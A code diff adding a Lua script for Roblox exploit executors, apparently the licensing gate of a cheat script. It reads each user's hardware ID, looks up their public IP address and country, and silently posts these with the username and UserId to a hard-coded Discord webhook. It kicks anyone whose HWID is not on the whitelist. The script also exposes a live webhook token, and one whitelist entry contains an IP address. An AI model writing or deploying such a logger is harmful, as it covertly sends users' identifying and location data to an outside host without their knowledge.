@@ -1,0 +1,110 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local Username = LocalPlayer.Name
+local UserId = LocalPlayer.UserId
+
+local hwid = "unknown"
+local isFake = false
+local executor = "Unknown"
+local ip = "Unavailable"
+local country = "Unavailable"
+local time = os.date("!%Y-%m-%d %H:%M:%S UTC") -- UTC timestamp
+
+pcall(function()
+	if identifyexecutor then
+		executor = identifyexecutor()
+		if typeof(executor) == "table" and executor.hwid then
+			hwid = executor.hwid
+			executor = executor.name or "Unknown"
+		end
+	elseif syn and syn.gethwid then
+		hwid = syn.gethwid()
+		executor = "Synapse X"
+	elseif KRNL_Hwid then
+		hwid = KRNL_Hwid()
+		executor = "KRNL"
+	elseif gethwid then
+		hwid = gethwid()
+		executor = "Custom"
+	end
+end)
+
+pcall(function()
+	local req = (http_request or request or syn and syn.request)
+	if req then
+		local ipRes = req({ Url = "https://api.ipify.org", Method = "GET" })
+		ip = ipRes.Body or "Unavailable"
+
+		if ip ~= "Unavailable" then
+			local geoRes = req({ Url = "http://ip-api.com/json/" .. ip, Method = "GET" })
+			local geoData = HttpService:JSONDecode(geoRes.Body)
+			country = geoData.country or "Unavailable"
+		end
+	end
+end)
+
+if hwid == "unknown" or hwid == "Unavailable" then
+	isFake = true
+	local path = "kineticsx_hwid.txt"
+	local readfile = readfile or function() return nil end
+	local writefile = writefile or function() end
+	local isfile = isfile or function() return false end
+
+	if isfile(path) then
+		hwid = readfile(path)
+	else
+		hwid = HttpService:GenerateGUID(false) .. "-" .. tostring(UserId) .. "-" .. tostring(ip)
+		writefile(path, hwid)
+	end
+end
+
+-- Whitelisted HWIDs
+local whitelistedHWIDs = {
+	["5794e7f1c171bfcb7e8bddf536fcf8063747da37925504c10a3421d239809d98"] = true,
+	["5A136ABB-2987-4E29-AD9A-6A8D152299D5-3482294171-70.92.176.203"] = true,
+	["267f537c5883ecda59ea7fad64613c0a575ae2f732a8c970e36b9066abc9f1a604b104984b4f09749e67c087e9f9d895616f1b605655f4919a3a74f467476580"] = true,
+	["629f680defe72938d64734f04284feebc973e4f419f5c9886c346e9245d08930"] = true,
+	["c79c0bc3e43d1106f981bb9536dceed77e93e166ed9f8d053323c5344d05c43221624979c5e9ae9d9e745a84669583373e512f7d11b4c72b2e831952e7138e50"] = true,
+    ["d124b94326bf3311db3fb9d9b14eba0536bd25283493fce40981d33974ecd08d3a5a9f4b1a728774d6260746c74aa36a"] = true
+}
+
+local isWhitelisted = whitelistedHWIDs[hwid] == true
+local whitelistStatus = isWhitelisted and "✅ Whitelisted" or "❌ Not Whitelisted"
+
+-- Webhook logging
+pcall(function()
+	local req = (http_request or request or syn and syn.request)
+	if req then
+		local fields = {
+			{ name = "👤 Username", value = Username, inline = true },
+			{ name = "🆔 UserId", value = tostring(UserId), inline = true },
+			{ name = "🔐 HWID", value = "```" .. hwid .. "```", inline = false },
+			{ name = "💻 Executor", value = executor, inline = true },
+			{ name = "🌐 IP", value = ip, inline = true },
+			{ name = "📍 Country", value = country, inline = true },
+			{ name = "🕒 Time (UTC)", value = time, inline = true },
+			{ name = "🧾 Status", value = whitelistStatus, inline = true }
+		}
+
+		req({
+			Url = "https://discord.com/api/webhooks/1384911435926343781/GcIZye_8vj5in_m3FiFGXOzAM2tuyqDANRCMM0DIZLZmcug3rqUPqtChvR1_tCaLn54-",
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = HttpService:JSONEncode({
+				username = "HWID Logger",
+				embeds = {{
+					title = "**Script Executed**",
+					color = isWhitelisted and 0x57F287 or 0xED4245,
+					fields = fields
+				}}
+			})
+		})
+	end
+end)
+
+if not isWhitelisted then
+	task.wait(2)
+	LocalPlayer:Kick("You're not whitelisted. (Error Code: 267)")
+end
